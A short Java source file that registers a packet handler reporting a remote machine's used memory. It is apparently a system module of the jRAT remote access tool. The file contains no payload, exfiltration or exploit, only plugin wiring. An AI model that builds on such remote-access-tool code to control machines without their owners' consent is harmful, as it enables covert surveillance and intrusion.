package jrat.module.system;

import jrat.api.Module;
import jrat.client.packets.incoming.IncomingPackets;

public class SystemClientModule extends Module {

    public void init() throws Exception {
        IncomingPackets.register((short) 33, Packet33UsedMemory.class);
    }

}
